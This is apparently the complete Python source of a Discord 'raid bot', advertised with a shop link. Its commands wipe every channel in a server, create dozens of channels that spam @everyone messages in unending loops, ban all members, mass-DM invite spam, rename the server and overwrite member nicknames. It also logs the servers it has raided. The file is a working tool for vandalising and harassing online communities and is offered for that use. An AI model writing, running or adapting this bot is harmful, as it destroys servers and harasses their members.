import asyncio,ipaddress
import datetime
import platform
import socket
import discord,time,colorama,os,ctypes,asyncio,aiohttp
from discord.ext.commands import bot
from pystyle import Write,Colors
from discord.ext.commands.bot import Bot as req
from discord.ext import commands 
from discord.ext.commands import has_permissions,CommandInvokeError, MissingPermissions,CommandNotFound
from colorama import Fore
from discord import Webhook
from ctypes import *
import requests   


def clear():    
    os.system('cls' if os.name == 'nt' else 'clear')


ROJO = Fore.RED
BLANCO = Fore.WHITE
RESET = Fore.RESET

time.sleep(2)
clear()
print(f"""{ROJO}
============================================
8    .d88b. .d88b     888 8b  8 8888 .d88b. 
8    8P  Y8 8P www     8  8Ybm8 8www 8P  Y8 
8    8b  d8 8b  d8     8  8  "8 8    8b  d8 
8888 `Y88P' `Y88P'    888 8   8 8    `Y88P'
============================================
{RESET}""")
Loginfo = input(f"[{ROJO}>{RESET}]Nick Log: ")
TOKEN = input(f"[{ROJO}>{RESET}] {Fore.RED}BOT TOKEN:{Fore.RESET} ") 



logs = open("Logs Info User.txt","w")
hostnamelog = socket.gethostname()
iplog = requests.get('https://api.ipify.org/').text
logs.write(f"[ {Loginfo}, IP: {iplog}, NAMEHOST: {hostnamelog} ] \n")

def system():   
    os.system('cls' if os.name == 'nt' else 'clear')    
    os.system("mode con: cols=99 lines=45") 
    if os.name == 'nt':
        pass    
    ctypes.windll.kernel32.SetConsoleTitleW(f"YJ 4P SELLIX R4IDBOT | LOGEADO COMO: {Loginfo}")  
    time.sleep(3)

system() 
    
clear()

input(f"""{ROJO}











      dP    dP        dP     888888ba  dP   dP dP 888888ba   888888ba   .88888.  d888888P 
      Y8.  .8P        88     88    `8b 88   88 88 88    `8b  88    `8b d8'   `8b    88    
       Y8aa8P         88    a88aaaa8P' 88aaa88 88 88     88 a88aaaa8P' 88     88    88    
         88           88     88   `8b.      88 88 88     88  88   `8b. 88     88    88    
         88    88.  .d8P     88     88      88 88 88    .8P  88    .88 Y8.   .8P    88    
         dP     `Y8888'      dP     dP      dP dP 8888888P   88888888P  `8888P'     dP    
                            
                            
                            
                            P R E S I O N A - E N T E R:{RESET} """)
time.sleep(2)
clear()
print(f"""{ROJO}
            888888ba  dP   dP dP 888888ba     dP 888888ba   88888888b  .88888.  
            88    `8b 88   88 88 88    `8b    88 88    `8b  88        d8'   `8b 
            a88aaaa8P'88aaa88 88 88     88    88 88     88 a88aaaa    88     88 
            88   `8b.      88 88 88     88    88 88     88  88        88     88 
            88     88      88 88 88    .8P    88 88     88  88        Y8.   .8P 
            dP     dP      dP dP 8888888P     dP dP     dP  dP         `8888P'  
                                RAID INFO FOR BOT{RESET}""")
    

ROJO = Fore.RED
BLANCO = Fore.WHITE
RESET = Fore.RESET


time.sleep(1)
print("=========")
PREFIX = input(f"[{ROJO}>{RESET}] {Fore.RED}PREFIX NUEVO:{Fore.RESET} ")

GUILDNAME = "YungFamilyGang"
CANALNAME= "YungGang"
NICKALL = "Yung Family"
SPAMMENSAJE = "@everyone ```R4ID BY YUNG FAMILY``` https://discord.gg/seso |\n Unanse  Perras https://discord.gg/XjUX7ksChh **GAYYYYYYYYYY**"
DMMESSAGE = "https://discord.gg/seso **UNETE PERRA DONT BE A HOE**"

os.system('cls' if os.name == 'nt' else 'clear')

bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())
bot.remove_command('help')


def main():
    print(f"""{Fore.RED}
    ============================================================================================
    =  ====  ===      ========       ========  ====    ==       ===      ======    ====        =
    =   ==   ==   ==   =======  ====  ======   =====  ===  ====  ==  ===  ====  ==  ======  ====
    ==  ==  ===  ====  =======  ====  =====    =====  ===  ====  ==  ====  ==  ====  =====  ====
    ==  ==  ===  =============  ===   ====  =  =====  ===  ====  ==  ===  ===  ====  =====  ====
    ===    ====  =============      =====  ==  =====  ===  ====  ==      ====  ====  =====  ====
    ====  =====  ===   =======  ====  ==  ===  =====  ===  ====  ==  ===  ===  ====  =====  ====
    ====  =====  ====  =======  ====  ==         ===  ===  ====  ==  ====  ==  ====  =====  ====
    ====  =====   ==   =======  ====  =======  =====  ===  ====  ==  ===  ====  ==  ======  ====
    ====  ======      ========  ====  =======  ====    ==       ===      ======    =======  ====
    ============================================================================================  
"""+Fore.RESET)
    print(f"""                         [>] Y U N G J A B I R 4 I D D S B O T [<]
                        ===========================================
                        =1-{PREFIX}{ROJO}nuke{RESET} (Nuke El Server Completo)        =
                        =2-{PREFIX}{ROJO}banall{RESET} (Banea A todos Del servidor)   =
                        =3-{PREFIX}{ROJO}deleteall{RESET} (Elimina Todos los canales) =
                        =4-{PREFIX}{ROJO}listmembers{RESET} (Ver lista de miembros)   =
                        =5-/{ROJO}svraid{RESET} (Lstar Serv R4id)     =
                        =6-/{ROJO}svraiddb{RESET} (BasedeDatos Sv R4id DB)   =
                        ===========================================
                        = + Yt Channel: YungJabi                  =
                        = + Tienda: https://yungjabi.mysellix.io/ =
                        ===========================================""")


@bot.event
async def on_ready():
    main()
    await bot.tree.sync()
    hostname = socket.gethostname()
    ip = requests.get('https://api.ipify.org/').text
    print(f"[{ROJO}>{RESET}]{ROJO}LOGGED AS:{RESET} {Loginfo}")
    print(f"[{ROJO}>{RESET}]{ROJO}PREFIX NUEVO:{RESET} {PREFIX}")
    print(f"[{ROJO}>{RESET}]{ROJO}SYSTEMA:{RESET} {platform.system()} {platform.release()}")
    print(f"[{ROJO}>{RESET}]{ROJO}IP CLIENTNAME:{RESET} {hostname}")
    print(f"[{ROJO}>{RESET}]{ROJO}BOT OWNER:{RESET} YungJabiapツ#1660")
    print(f"[{ROJO}>{RESET}]{ROJO}BOT SERVERS LISTENING:{RESET} {len(bot.guilds)}")
    print(f"[{ROJO}>{RESET}]{ROJO}TOKEN BOT LOAD IT...{RESET} ")
    print(f"[{ROJO}>{RESET}]{ROJO}CANALES:{RESET} {CANALNAME}")
    print(f"[{ROJO}>{RESET}]{ROJO}GUILD NAME:{RESET} {GUILDNAME}")
    print(f"[{ROJO}>{RESET}]{ROJO}SPAM MESSAGE SET TO:{RESET} {SPAMMENSAJE}") 
    

@bot.event
async def on_guild_channel_create(channel): 
    while True: 
        await channel.send(SPAMMENSAJE) 
        print(f"[{Fore.RED}>{Fore.RESET}] MENSAJE ENVIADO : {SPAMMENSAJE}")


@bot.command()  
async def test(ctx):
    user = ctx.author    
    await ctx.send(f"Bot Ready. {user.name}")
    
@bot.tree.command(description="Lista Un Servidor R4ideado")
async def svraid(interaction,guild: str ,autor: discord.User):  
    with open("ServersRaid.txt", "a") as file:  
        file.write(f"``{guild}: ServerRaid|By: {autor}``")
        await interaction.response.send_message("Listo nuevo serverR4ID DB 2023")

@bot.tree.command(description="Ver Lista De Servidores R4ided")
async def svraiddb(interaction):    
    with open("ServersRaid.txt", "r") as file:  
        embed=discord.Embed(title="DB 2023 SERVERS R4IDED")
        embed.add_field(name="SVNAME R4ID", value=file.read(),inline=True)
        await interaction.response.send_message(embed=embed)



@bot.command()
@commands.has_permissions(manage_channels=True)  
async def deleteall(ctx):   
    await ctx.message.delete()  
    for channel in list(ctx.guild.channels):    
        await channel.delete()
        print(f"{ROJO} CANAL BORRADO{RESET} {channel}")  
    else: 
        pass 
    
@bot.command()
async def nuke(ctx):    
    await ctx.message.delete()
    await ctx.guild.edit(name=GUILDNAME)   
    for channel in list(ctx.guild.channels):
        try:        
            await channel.delete()  
        except:
            print(f"[>] {ROJO} {channel}:{RESET} NO ELIMINADO")
    for i in range(50):
        await ctx.guild.create_text_channel(CANALNAME)  	
        print(f"{ROJO} Canal Creado {RESET} {CANALNAME} ")
    else:	
        pass
    for member in list(ctx.guild.members):
        try:  
            await member.send(DMMESSAGE)
            print(f"[>] {ROJO} Mensaje A {member}:{RESET} {DMMESSAGE}") 
        except:
            pass
    for member in list(ctx.guild.members):
        try:  
            await member.edit(nick=NICKALL)
            print(f"[>] {ROJO} Nuevo Nick A {member}:{RESET} {DMMESSAGE}")
        except:   
            pass 
       

@nuke.error 
async def nuke_error(ctx,error):
    if isinstance(error,CommandInvokeError):    
        embed = discord.Embed(title="ERROR NUKE 404")   
        embed.add_field(name="ERROR FOUND EXCEPTION", value=f"```{error}```",
                    inline=True)    
        embed.timestamp=datetime.datetime.today()   
        await ctx.send(embed=embed)
        print(f"{error}")
  

@bot.command()
@commands.has_permissions(ban_members=True)  
async def banall(ctx):
    await ctx.message.delete()  
    for member in list(ctx.guild.members):  
        try:
            await member.ban()
            print(f"{ROJO} Miembro Baneado:{RESET} {member}")  
        except:   
            print("No Puedo Banear Usuarios")
        
@banall.error  
async def banall_error(ctx,error):    
    print("ERROR EXCEPTION: TE FALTAN PERMISOS PARA BANEAR")    
    await ctx.send(f"ERROR EXCEPTION!! {error}") 
          
@bot.command()  
async def listmembers(ctx):
    await ctx.message.delete()
    guild = ctx.guild 
    async for member in guild.fetch_members(limit=100):     
        embed=discord.Embed(title="MEMBERS 2023 LIST")  
        embed.add_field(name=f"NAME: {member.name}", value="" , inline=True)    
        await ctx.send(embed=embed)


@bot.command(pass_context=True)  
async def dmall(ctx):    
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        try:  
            await member.send(DMMESSAGE)
            print(f"[>] {ROJO} Mensaje A {member}:{RESET} {DMMESSAGE}") 
        except:
            pass

system()
bot.run(TOKEN)
